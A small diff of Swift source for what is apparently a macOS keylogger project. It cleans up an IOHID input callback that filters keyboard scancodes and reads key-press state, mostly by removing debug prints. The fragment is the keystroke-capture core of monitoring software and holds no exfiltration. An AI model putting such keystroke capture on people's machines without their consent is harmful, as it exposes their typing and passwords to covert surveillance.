@@ -8,7 +8,7 @@
 
 import Foundation
 import Cocoa
-//import IOKit.hid
+
 
 class CallBackFunctions
 {
@@ -37,28 +37,22 @@ class CallBackFunctions
         
         let mySelf = Unmanaged<Keylogger>.fromOpaque(context!).takeUnretainedValue()
         let elem: IOHIDElement = IOHIDValueGetElement(device);
-        var test: Bool
-        print("Handle_IOHIDInputValueCallback")
-//        NSLog("%@", elem);
-//        NSLog("%@", test);
+
         if (IOHIDElementGetUsagePage(elem) != 0x07)
         {
             return
         }
+
         let scancode = IOHIDElementGetUsage(elem);
-        print(scancode);
         if (scancode < 4 || scancode > 231)
         {
             return
         }
-        let pressed = IOHIDValueGetIntegerValue(device );
 
-        print(pressed);
-        
+        let pressed = IOHIDValueGetIntegerValue(device);
         let timeStamp = "\n" + Date().description(with: Locale.current) + "\n"
-//            fh?.write(timeStamp.data(using: .utf8)!)
-        print(timeStamp.data(using: .utf8)!)
 
+        print(timeStamp.data(using: .utf8)!)
     }
 }
 
